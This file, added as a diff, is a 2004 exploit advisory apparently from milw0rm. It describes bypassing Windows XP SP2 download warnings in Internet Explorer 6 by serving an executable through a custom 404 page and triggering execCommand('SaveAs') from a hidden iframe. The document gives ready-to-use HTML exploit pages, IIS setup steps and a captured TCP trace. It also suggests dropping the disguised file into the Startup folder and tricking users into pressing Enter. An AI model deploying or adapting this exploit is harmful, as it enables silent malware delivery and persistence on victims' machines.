@@ -1,0 +1,153 @@
+Orginal Advisory and exploit by cyber_flash (Vengy) 
+
+
+Circumvent Windows XP SP2 security features using execCommand 'SaveAs' function!
+
+Demonstration:
+
+Notice that you don't receive any warning messages such as:
+"File Download - Security Warning" or "Open File - Security Warning".
+
+If "Hide file extensions for known file types" (Tools->Folder Options...->View) is enabled, (ie., 'funny joke.exe' appears as 'funny joke')
+it's possible to trick a user into downloading a malicious executable file masquerading as an html document!
+
+Windows XP SP2 normally prevents direct downloading. For example: calc.exe
+ 
+
+Description:
+
+When your browser cannot locate the URL that you entered in the address bar, you will receive a 404 error message
+telling you that the file was not found.
+
+This exploit utilizes a custom HTTP 404 error message (v.exe) and feeds that eventually to the execCommand Method.
+User input is required because the method always prompts a "Save HTML Document" dialog.
+
+1. Bypasses the "File Download - Security Warning".
+
+Each time you click a download link, WinXP pops up a "File Download- Security Warning", making you aware that
+Windows is downloading a program and asking for your permission to complete the download process.
+
+2. Bypasses the "Open File - Security Warning".
+
+Launching a downloaded executable that originates from an untrusted location (zone) such as the Internet also brings
+up a "Open File - Security Warning" that asks for permission to install the file in case it's dangerous.
+ 
+
+The execCommand Method:
+
+Executes a command on the current document.
+
+One of the many parameters of this method is the SaveAs Command which saves the current Web page to a local file.
+The SaveAs Command has the following format:
+
+document.execCommand('SaveAs','1','Name of the webpage.htm');
+ 
+
+Platforms Tested:
+
+    * Microsoft Windows 2000 Server
+    * Microsoft Windows XP Professional (IIS V5.1)
+    * Internet Explorer Version: 6
+    * NOT tested on Windows 2003 Server.
+       
+
+Exploit:
+
+The following code requires no special server setup, and should work from any webpage that IE 6.0 fetches:
+<html>
+<body>
+<iframe src='http://your.domain.com/v.exe?.htm' name="NotFound" width="0" height="0"></iframe>
+Click <a href=# onclick="javascript:document.frames.NotFound.document.execCommand('SaveAs',1,'funny joke.exe');">here</a>.
+</body>
+</html>
+
+Also, here's an example that requires modifying the IIS Error Mapping Properties (see below):
+<html>
+<body>
+<iframe src='vengy404.htm' name="NotFound" width="0" height="0"></iframe>
+Click <a href=# onclick="javascript:document.frames.NotFound.document.execCommand('SaveAs',1,'funny joke.exe');">here</a>.
+</body>
+</html>
+
+NOTE: Using 'C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\funny joke.exe' will place the file into the users Startup folder!
+The file v.exe (replace it with any file you like) within the IFRAME src attribute will be delivered to the user upon saving.
+
+Steps to configure IIS:
+
+Launch Internet Information Services manager.
+Under the 'Custom Errors' tab, modify the Error Mapping Properties as follows:
+
+   1. Error Code: 404
+   2. Default Text: Not Found
+   3. Message Type: URL
+   4. URL: /v.exe (name of the executable which you'd like to send to the user. ;)
+
+Within the HTML page, insert an IFRAME as follows:
+
+<iframe src='vengy404.htm' name="NotFound" width="0" height="0"></iframe>
+
+The file 'vengy404.htm' intentionally doesn't exist on the server, so it'll trigger a 404 error message as defined above.
+But, the javascript code below references the stealthy v.exe data within the frame 'NotFound' and is piped to 'funny joke.exe'
+when prompted to save the file:
+
+javascript:document.frames.NotFound.document.execCommand('SaveAs',1,'funny joke.exe');
+ 
+
+Follow TCP Stream:
+
+Here's what occurs internally when fetching the exploit webpage plus the 404 error message (v.exe).
+
+GET /// HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+If-Modified-Since: Tue, 16 Nov 2004 02:34:44 GMT
+If-None-Match: "7e5914d584cbc41:10d2"
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: insecure.hopto.org:53
+Connection: Keep-Alive
+
+HTTP/1.1 304 Not Modified
+Server: Microsoft-IIS/5.1
+Date: Tue, 16 Nov 2004 12:31:00 GMT
+Content-Location: http://insecure.hopto.org:53/index.htm
+ETag: "7e5914d584cbc41:10d2"
+Content-Length: 0
+
+GET ///vengy404.htm HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: insecure.hopto.org:53
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.1
+Cache-Control: no-cache,no-transform
+Expires: Tue, 16 Nov 2004 12:31:00 GMT
+Content-Location: http://insecure.hopto.org:53/v.exe?404;http://insecure.hopto.org///vengy404.htm
+Vary: *
+Date: Tue, 16 Nov 2004 12:31:00 GMT
+Content-Type: application/octet-stream
+Accept-Ranges: bytes
+Content-Length: 91408
+<---V.EXE binary data goes here --->
+ 
+
+Conclusion:
+
+Overall IE attempts to intercept risky code and prompts a security warning message,
+but it seems to allow custom HTTP errors to filter thru those security checks.
+
+Also, by creating a 404 .lnk shortcut file with a hotkey of 'Enter', saving it to the desktop installs a global hotkey,
+so it may be possible to execute the downloaded file by simply forcing the user to press the Enter key "alert('Thanks. Press Return')".
+
+Funny and scary how a few well placed characters <iframe src='v.exe?.htm' .... can confuse the IE monster,
+whereas specifying <iframe src='v.exe' .... is handled correctly - wow!
+
+Combined with existing exploits, it may be possible to save the data locally without user interaction?
+Anyhow, I'm positive there are many hidden exploits out there which are used to gain entry into our PC's
+regardless of how many patches M$ might supply. Geez, my computer is probably owned right now ... ahhhh...
+
+# milw0rm.com [2004-11-19]
